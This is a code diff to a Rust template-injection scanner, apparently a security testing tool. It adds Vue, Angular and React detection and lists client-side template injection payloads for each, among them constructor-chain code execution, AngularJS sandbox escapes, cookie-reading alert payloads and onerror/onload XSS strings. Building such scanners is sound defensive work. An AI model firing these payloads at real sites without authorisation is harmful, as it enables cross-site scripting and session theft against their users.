@@ -167,6 +167,24 @@ impl TemplateInjectionScanner {
                     info!("[SSTI] Detected Express/Node.js - using Pug/EJS/Handlebars payloads");
                     return vec!["pug".to_string(), "ejs".to_string(), "handlebars".to_string()];
                 }
+
+                // Vue.js → Client-Side Template Injection (CSTI)
+                if fw_lower.contains("vue") {
+                    info!("[CSTI] Detected Vue.js - using Vue CSTI payloads");
+                    return vec!["vuejs".to_string()];
+                }
+
+                // Angular → Client-Side Template Injection (CSTI)
+                if fw_lower.contains("angular") {
+                    info!("[CSTI] Detected Angular - using Angular CSTI payloads");
+                    return vec!["angular".to_string()];
+                }
+
+                // React → Client-Side Template Injection (limited)
+                if fw_lower.contains("react") {
+                    info!("[CSTI] Detected React - using React CSTI payloads");
+                    return vec!["react".to_string()];
+                }
             }
 
             // Check detected technologies for PHP frameworks
@@ -344,6 +362,92 @@ impl TemplateInjectionScanner {
 
                 // Detection
                 ("{{.}}".to_string(), "Current context".to_string()),
+            ],
+
+            // Vue.js Client-Side Template Injection (CSTI)
+            "vuejs" => vec![
+                // Basic evaluation - Vue.js uses {{ }} for interpolation
+                ("{{7*7}}".to_string(), "Vue.js math evaluation".to_string()),
+                ("{{constructor.constructor('return 7*7')()}}".to_string(), "Constructor chain execution".to_string()),
+
+                // DOM XSS via Vue CSTI
+                ("{{alert(1)}}".to_string(), "Direct alert injection".to_string()),
+                ("{{alert(document.cookie)}}".to_string(), "Cookie theft via CSTI".to_string()),
+                ("{{alert(document.domain)}}".to_string(), "Domain leak via CSTI".to_string()),
+
+                // $emit constructor bypass (from bug bounty tip)
+                ("{{$emit.constructor('alert(document.cookie)')()}}".to_string(), "$emit constructor XSS".to_string()),
+                ("{{$emit.constructor`alert(document.cookie)`()}}".to_string(), "$emit constructor with backticks".to_string()),
+
+                // Vue.js specific objects
+                ("{{$data}}".to_string(), "Vue data object access".to_string()),
+                ("{{$el}}".to_string(), "Vue element access".to_string()),
+                ("{{$root}}".to_string(), "Vue root instance access".to_string()),
+                ("{{$refs}}".to_string(), "Vue refs access".to_string()),
+                ("{{$options}}".to_string(), "Vue options access".to_string()),
+
+                // Advanced constructor bypasses
+                ("{{_c.constructor('alert(1)')()}}".to_string(), "_c constructor bypass".to_string()),
+                ("{{_v.constructor('alert(1)')()}}".to_string(), "_v constructor bypass".to_string()),
+                ("{{_self.constructor.constructor('alert(1)')()}}".to_string(), "_self double constructor".to_string()),
+
+                // Filter bypass with String.fromCharCode
+                ("{{constructor.constructor('alert(String.fromCharCode(88,83,83))')()}}".to_string(), "CharCode bypass".to_string()),
+
+                // Prototype chain exploitation
+                ("{{this.constructor.constructor('alert(1)')()}}".to_string(), "this.constructor chain".to_string()),
+                ("{{[].constructor.constructor('alert(1)')()}}".to_string(), "Array constructor chain".to_string()),
+                ("{{''['constructor']['constructor']('alert(1)')()}}".to_string(), "String bracket notation".to_string()),
+
+                // v-html directive detection (leads to XSS)
+                ("{{_c('div',{domProps:{innerHTML:'<img src=x onerror=alert(1)>'}})}}".to_string(), "v-html injection".to_string()),
+            ],
+
+            // AngularJS Client-Side Template Injection (CSTI)
+            "angular" => vec![
+                // Basic evaluation
+                ("{{7*7}}".to_string(), "Angular math evaluation".to_string()),
+                ("{{constructor.constructor('return 7*7')()}}".to_string(), "Constructor chain".to_string()),
+
+                // AngularJS sandbox bypass (< 1.6)
+                ("{{constructor.constructor('alert(1)')()}}".to_string(), "Sandbox bypass alert".to_string()),
+                ("{{$on.constructor('alert(1)')()}}".to_string(), "$on constructor bypass".to_string()),
+                ("{{$watch.constructor('alert(1)')()}}".to_string(), "$watch constructor bypass".to_string()),
+
+                // AngularJS 1.x sandbox escapes
+                ("{{'a]'.constructor.prototype.charAt=[].join;$eval('x]alert(1)')}}".to_string(), "charAt sandbox escape".to_string()),
+                ("{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x]alert(1)');}}".to_string(), "Prototype pollution escape".to_string()),
+
+                // $scope access
+                ("{{$id}}".to_string(), "Scope ID access".to_string()),
+                ("{{$parent}}".to_string(), "Parent scope access".to_string()),
+                ("{{$root}}".to_string(), "Root scope access".to_string()),
+
+                // Modern Angular (2+) is safer, but check for unsafe bindings
+                ("{{constructor}}".to_string(), "Constructor access check".to_string()),
+
+                // orderBy filter exploit
+                ("{{'a]'.constructor.prototype.charAt=''.valueOf;$eval('x]alert(1)')}}".to_string(), "valueOf exploit".to_string()),
+
+                // ng-init exploitation
+                ("{{$eval('alert(1)')}}".to_string(), "$eval injection".to_string()),
+            ],
+
+            // React CSTI (limited - mostly dangerouslySetInnerHTML)
+            "react" => vec![
+                // React doesn't use {{ }} but check for JSX injection points
+                ("{7*7}".to_string(), "JSX expression".to_string()),
+
+                // dangerouslySetInnerHTML detection (indirect)
+                ("<img src=x onerror=alert(1)>".to_string(), "HTML injection for dangerouslySetInnerHTML".to_string()),
+                ("<svg onload=alert(1)>".to_string(), "SVG injection".to_string()),
+
+                // Template literal injection
+                ("${alert(1)}".to_string(), "Template literal injection".to_string()),
+                ("${7*7}".to_string(), "Template literal math".to_string()),
+
+                // Next.js specific
+                ("{{constructor.constructor('alert(1)')()}}".to_string(), "Constructor chain (if using templating)".to_string()),
             ],
 
             _ => vec![],
